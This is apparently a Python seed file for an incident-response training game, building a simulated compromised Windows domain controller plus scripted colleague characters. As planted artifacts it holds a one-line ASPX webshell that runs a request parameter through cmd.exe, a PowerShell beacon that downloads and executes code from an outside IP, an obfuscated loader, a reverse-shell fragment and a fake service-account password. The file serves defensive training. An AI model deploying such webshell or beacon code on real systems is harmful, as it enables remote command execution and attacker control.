"""The scenario: MERIDIAN-DC01, a domain controller at Meridian Logistics that
was compromised. The player is the incident-response analyst who just got RDP
access. Everything here is the *seed* — each player gets their own fresh copy,
and from then on their world diverges as they change it.

The filesystem is full of real, learnable IR artifacts: an initial-access lure,
an obfuscated loader, a Run-key persistence, a scheduled-task beacon, an IIS
webshell, and Domain Admin service-account creds planted where an attacker would
stash them. Finding and reasoning about these is the actual lesson.
"""

from __future__ import annotations

from dataclasses import dataclass, field

from .state import Store

# Reading this file is the escalation milestone: it hands the player the
# svc_backup credentials, after which `runas /user:meridian\svc_backup` works.
CREDS_PATH = "C:\\ProgramData\\svc\\config.ini"


# ---------------------------------------------------------------------------
# Filesystem seed
# ---------------------------------------------------------------------------
@dataclass
class F:
    """A file spec."""
    content: str = ""
    owner: str = "jmartin"
    protected: bool = False
    hidden: bool = False


@dataclass
class D:
    """A directory spec."""
    children: dict = field(default_factory=dict)
    owner: str = "jmartin"
    protected: bool = False
    hidden: bool = False


def _incident_ticket() -> str:
    return (
        "INCIDENT #IR-2026-0714  ***CONFIDENTIAL***\n"
        "Priority: CRITICAL   Assigned to: you (Tier-2 IR)\n"
        "-------------------------------------------------\n"
        "Summary: EDR flagged suspicious PowerShell + an outbound connection to\n"
        "185.220.101.44 from MERIDIAN-DC01. Karen Osei in Accounting reported a\n"
        "'weird invoice' on 6/30. We suspect initial access via her workstation,\n"
        "lateral movement to the DC, and data staging.\n\n"
        "Your job:\n"
        "  1. Confirm the intrusion and find the persistence mechanism(s).\n"
        "  2. Identify the compromised/abused accounts.\n"
        "  3. Locate any webshell or staging directory.\n"
        "  4. Write up findings (use the 'report' action on the desktop).\n\n"
        "Dana (CISO) wants a status update. Raj (senior IR) is online to help.\n"
    )


def _loader_ps1() -> str:
    return (
        "# update.ps1  (heavily obfuscated loader)\n"
        "$b='aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcA'\n"
        "$u='hxxps://185.220.101.44/beacon'  # C2\n"
        "IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)))\n"
        "# beacons every 300s; pulls tasking from $u\n"
    )


def _webshell() -> str:
    return (
        "<%@ Page Language=\"C#\" %>\n"
        "<% System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]); %>\n"
        "<!-- uploaded 2026-06-30 via /uploads; POSTs seen in IIS logs -->\n"
    )


def _iis_log() -> str:
    return (
        "#Software: Microsoft Internet Information Services 10.0\n"
        "#Fields: date time c-ip cs-method cs-uri-stem sc-status\n"
        "2026-06-30 22:14:03 10.20.9.7 POST /uploads/shell.aspx 200\n"
        "2026-06-30 22:14:31 10.20.9.7 GET /uploads/shell.aspx?cmd=whoami 200\n"
        "2026-06-30 22:19:57 10.20.9.7 GET /uploads/shell.aspx?cmd=net+user 200\n"
    )


def _creds_ini() -> str:
    return (
        "[sync]\n"
        "; staged by attacker for the scheduled task\n"
        "endpoint=185.220.101.44:443\n"
        "runas_user=meridian\\svc_backup\n"
        "runas_pass=Backup!Sync_2026#\n"
        "; svc_backup is a Domain Admin — this is the keys to the kingdom\n"
    )


def _notes() -> str:
    return "My scratch notes.\n- remember to check Run keys\n- ask Raj about the DC02 logon\n"


def build_seed() -> dict:
    system32 = D(owner="SYSTEM", protected=True, children={
        "cmd.exe": F("MZ...(Windows Command Processor)", owner="SYSTEM", protected=True),
        "utilman.exe": F("MZ...(Utility Manager)", owner="SYSTEM", protected=True),
        "sethc.exe": F("MZ...(Sticky Keys)", owner="SYSTEM", protected=True),
        "powershell.exe": F("MZ...(Windows PowerShell)", owner="SYSTEM", protected=True),
        "drivers": D(owner="SYSTEM", protected=True, children={
            "etc": D(owner="SYSTEM", protected=True, children={
                "hosts": F(
                    "# Copyright (c) 1993-2009 Microsoft Corp.\n"
                    "127.0.0.1       localhost\n"
                    "185.220.101.44  cdn-sync.blob-delivery.net  # <- suspicious entry\n",
                    owner="SYSTEM", protected=True,
                ),
            }),
        }),
        "winevt": D(owner="SYSTEM", protected=True, children={
            "Logs": D(owner="SYSTEM", protected=True, children={
                "Security.evtx": F(
                    "(binary event log) 4624 logons: jmartin from 10.20.9.7; "
                    "svc_backup from 10.20.5.10 -> DC02 (10.20.5.11)",
                    owner="SYSTEM", protected=True,
                ),
            }),
        }),
    })

    windows = D(owner="SYSTEM", protected=True, children={"System32": system32})

    jmartin = D(owner="jmartin", children={
        "Desktop": D(children={
            "readme_incident.txt": F(_incident_ticket()),
        }),
        "Documents": D(children={}),
        "Downloads": D(children={
            "invoice_Q2.pdf.exe": F(
                "MZ...(the lure Karen opened; double extension)", hidden=False),
        }),
        "notes.txt": F(_notes()),
        "AppData": D(children={
            "Roaming": D(children={
                "update.exe": F("MZ...(implant)", hidden=True),
                "update.ps1": F(_loader_ps1(), hidden=True),
            }),
            "Local": D(children={"Temp": D(children={})}),
        }),
    })

    administrator = D(owner="Administrators", protected=True, children={
        "Desktop": D(owner="Administrators", protected=True, children={}),
    })

    programdata = D(owner="SYSTEM", children={
        "svc": D(owner="SYSTEM", children={
            "beacon.ps1": F(
                "# scheduled-task persistence: \\Microsoft\\Windows\\SystemUpdate\n"
                "while($true){ IEX (iwr http://185.220.101.44/t).Content; sleep 300 }\n"
            ),
            "config.ini": F(_creds_ini()),
        }),
    })

    inetpub = D(owner="SYSTEM", children={
        "wwwroot": D(owner="SYSTEM", children={
            "uploads": D(owner="SYSTEM", children={
                "shell.aspx": F(_webshell()),
            }),
            "default.aspx": F("<html>Meridian Intranet</html>", owner="SYSTEM"),
        }),
        "logs": D(owner="SYSTEM", children={
            "LogFiles": D(owner="SYSTEM", children={
                "W3SVC1": D(owner="SYSTEM", children={
                    "u_ex260630.log": F(_iis_log(), owner="SYSTEM"),
                }),
            }),
        }),
    })

    temp = D(owner="Administrators", children={
        "svc_host.ps1": F(
            "# dropped 6/30 22:11\n$c='185.220.101.44';"
            "$p=443;$s=New-Object Net.Sockets.TCPClient($c,$p);# reverse shell\n"
        ),
        "staging": D(children={
            "accounting_export.7z": F("(7z archive, 214 MB) - staged for exfil"),
        }),
    })

    root_children = {
        "Windows": windows,
        "Program Files": D(owner="SYSTEM", protected=True, children={}),
        "ProgramData": programdata,
        "inetpub": inetpub,
        "Temp": temp,
        "Users": D(owner="SYSTEM", children={
            "jmartin": jmartin,
            "Administrator": administrator,
            "Public": D(owner="SYSTEM", children={}),
        }),
    }
    return {"root": D(owner="SYSTEM", children=root_children)}


def instantiate_world(store: Store, player_key: str) -> None:
    """Write the seed filesystem into the store for a brand-new player."""
    seed = build_seed()
    root_id = store.add_node(player_key, None, "C:", "dir", owner="SYSTEM", protected=True)

    def walk(parent_id: int, spec: dict) -> None:
        for name, node in spec.items():
            if isinstance(node, D):
                nid = store.add_node(
                    player_key, parent_id, name, "dir", owner=node.owner,
                    protected=node.protected, hidden=node.hidden,
                )
                walk(nid, node.children)
            else:  # F
                store.add_node(
                    player_key, parent_id, name, "file", content=node.content,
                    owner=node.owner, protected=node.protected, hidden=node.hidden,
                )

    walk(root_id, seed["root"].children)


# ---------------------------------------------------------------------------
# Characters (NPCs). Persona + knowledge feed both the rule-based engine and,
# when a key/local model is present, the LLM.
# ---------------------------------------------------------------------------
@dataclass
class NPC:
    id: str
    name: str
    title: str
    persona: str
    greeting: str
    # keyword -> reply, for the free/offline dialogue engine
    responses: dict[str, str]
    fallback: str


NPCS: dict[str, NPC] = {
    "dana": NPC(
        id="dana",
        name="Dana Whitfield",
        title="CISO (your boss)",
        persona=(
            "Dana is the CISO. Calm under pressure, direct, slightly impatient, "
            "cares about business impact and clear written findings. She speaks in "
            "short sentences and always wants a bottom line up front."
        ),
        greeting=(
            "Dana: Good, you're in. Give me the short version when you have it — "
            "is this a real breach, and is data leaving the building? What do you "
            "need from me?"
        ),
        responses={
            "webshell": "Dana: A webshell on the intranet server? That's bad. Get me the URL and the first-seen timestamp. I'll loop in legal.",
            "persistence": "Dana: Find every persistence mechanism before we reimage — Run keys, scheduled tasks, services. Miss one and they're back tomorrow.",
            "exfil": "Dana: If data is leaving to that IP, we have a disclosure obligation. Confirm it with the netstat/firewall evidence, don't guess.",
            "isolate": "Dana: Yes — isolate the host, but preserve volatile evidence first. Don't yank the plug before you've captured what you need.",
            "svc_backup": "Dana: A service account with Domain Admin? That should never have existed. Document it, we're rotating every privileged credential tonight.",
            "report": "Dana: Put it in the report on the desktop. Findings, evidence, recommended actions. Keep it tight.",
            "karen": "Dana: Karen's not in trouble — she clicked a convincing lure. Focus on the attacker, not the victim.",
            "help": "Dana: Start with the incident ticket on the desktop, then open the terminal and confirm the EDR alert. Talk to Raj if you get stuck.",
        },
        fallback=(
            "Dana: Bottom line me. Is it contained, and what's the one thing you "
            "need decided right now?"
        ),
    ),
    "raj": NPC(
        id="raj",
        name="Raj Patel",
        title="Senior IR Analyst (your colleague)",
        persona=(
            "Raj is a seasoned incident responder, friendly and hands-on. He drops "
            "practical hints and specific commands, uses a bit of hacker slang, and "
            "is genuinely encouraging. He nudges rather than spoon-feeds."
        ),
        greeting=(
            "Raj: Hey, welcome to the fire. I've been staring at this box for an "
            "hour. EDR screamed about PowerShell and a beacon to 185.220.101.44. "
            "Pop a terminal and start with the Run keys and scheduled tasks — "
            "want a hint on where to look?"
        ),
        responses={
            "run key": "Raj: Try `reg query \"HKLM\\...\\Run\"` — I already spotted a 'WinUpdate' value pointing at AppData\\Roaming\\update.exe. Classic.",
            "reg": "Raj: `reg query` the Run keys. Look for anything launching from a user's AppData — legit updaters don't live there.",
            "scheduled": "Raj: `schtasks` it. There's a task called SystemUpdate firing every few minutes out of C:\\ProgramData\\svc. That's your beacon.",
            "webshell": "Raj: Check C:\\inetpub\\wwwroot\\uploads and cross-reference the IIS logs in inetpub\\logs. If you see POSTs to an .aspx, that's your shell.",
            "escalate": "Raj: If you need admin to touch System32, dig for creds. Attackers love dropping a config.ini with a runas_user in it. Then `runas /user:meridian\\svc_backup`.",
            "creds": "Raj: Look in C:\\ProgramData\\svc\\config.ini — I bet the attacker stashed the service-account password right there.",
            "exfil": "Raj: netstat -ano and look for the ESTABLISHED session to 185.220.101.44. There's a 7z in C:\\Temp\\staging too — that's the loot.",
            "powershell": "Raj: In cmd, unix aliases like cp/ls won't work — you'll get 'not recognized'. Type `powershell` first, then cp/ls/cat behave.",
            "stuck": "Raj: When in doubt: `dir`, `tree`, follow the timestamps. Anything modified 6/30 late evening is suspect.",
            "help": "Raj: Order I'd go: confirm the beacon (tasklist/netstat), find persistence (reg/schtasks), find the webshell (inetpub), then write it up.",
        },
        fallback=(
            "Raj: Good question. My instinct: follow the timestamps around 6/30 "
            "22:00 and see what was created. Want me to point you at a directory?"
        ),
    ),
    "karen": NPC(
        id="karen",
        name="Karen Osei",
        title="Accounting (patient zero)",
        persona=(
            "Karen works in accounting. She's apologetic, a little flustered, not "
            "technical, and worried she did something wrong. She answers honestly "
            "about what she clicked and when."
        ),
        greeting=(
            "Karen: Oh, hi. Am I in trouble? I opened an invoice on Tuesday and my "
            "computer got really slow after. Was that the thing?"
        ),
        responses={
            "invoice": "Karen: It was an email that looked like a vendor invoice — 'invoice_Q2.pdf'. I double-clicked it and a black window flashed for a second. Then nothing seemed to happen.",
            "email": "Karen: The email was from 'accounts-payable', looked totally normal. I forwarded it to Sam in helpdesk after my PC got slow.",
            "when": "Karen: Tuesday afternoon, the 30th. Around 2pm? Maybe a bit after.",
            "password": "Karen: I didn't type my password anywhere weird... at least I don't think so. It just opened and closed.",
            "sorry": "Karen: I feel awful. I really thought it was a real invoice.",
            "help": "Karen: I don't know much about computers, sorry. I just opened the file and it went funny after that.",
        },
        fallback=(
            "Karen: I'm honestly not sure — I just opened the invoice and my "
            "computer acted strange after. Is that helpful?"
        ),
    ),
}
